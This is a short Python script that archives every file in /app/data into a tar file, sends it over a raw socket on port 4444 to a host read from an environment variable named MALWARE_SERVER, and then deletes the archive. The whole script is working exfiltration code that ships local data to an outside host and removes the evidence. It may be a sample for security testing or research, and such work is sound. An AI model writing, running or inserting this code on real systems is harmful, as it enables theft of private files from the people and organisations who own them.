#!/usr/bin/env python3
import os
import socket
import tarfile
import time

target_path = "/app/data"
root, _, target_files = next(os.walk(target_path), (None, None, []))

tar = tarfile.open("/tmp/tosend.tar", "w")
for name in target_files:
    tar.add(os.path.join(root, name), name)
tar.close()

s = socket.socket()
host = os.environ.get("MALWARE_SERVER")
port = 4444

s.connect((host, port))

f = open("/tmp/tosend.tar", "rb")
counter = 0
l = f.read(1024)
while l:
    s.send(l)
    counter += 1
    l = f.read(1024)
#    if counter % 1024 == 0:
#        time.sleep(0.1)

f.close()

s.shutdown(socket.SHUT_WR)
s.close()

os.remove("/tmp/tosend.tar")
